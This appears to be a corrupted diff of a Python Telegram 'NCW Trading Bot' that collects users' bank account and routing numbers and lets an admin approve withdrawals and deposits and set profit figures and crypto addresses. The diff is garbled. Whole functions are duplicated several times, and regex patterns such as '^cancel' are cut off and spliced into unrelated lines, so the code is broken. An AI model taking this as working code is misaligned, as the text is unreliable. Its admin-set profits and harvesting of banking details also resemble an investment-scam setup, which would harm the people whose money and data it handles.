-                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
             ],
             WITHDRAW_ROUTING: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_routing_number),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+            ],
+        },
+        fallbacks=[
+            CommandHandler("start", start),
+            CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+        ],
+        per_message=False
     )
-    return MAIN_MENU
+    
+    application.add_handler(conv_handler)
+    application.add_handler(CommandHandler("getid", get_id))
+    application.add_handler(CommandHandler("approve", approve_deposit))
+    application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
+    application.add_handler(CommandHandler("updateprofit", update_profit))
+    application.add_handler(CommandHandler("updatecrypto", update_crypto_address))
+    application.add_handler(CommandHandler("approveuser", approve_user))
+    application.add_handler(CommandHandler("listusers", list_users))
+    application.add_handler(CommandHandler("adminhelp", admin_help))
+    
+    application.add_error_handler(error_handler)
+    
+    logger.info("Starting NCW Trading Bot...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES, timeout=30)
 
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(back_to_menu, pattern='^
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+if __name__ == '__main__':
+    main()
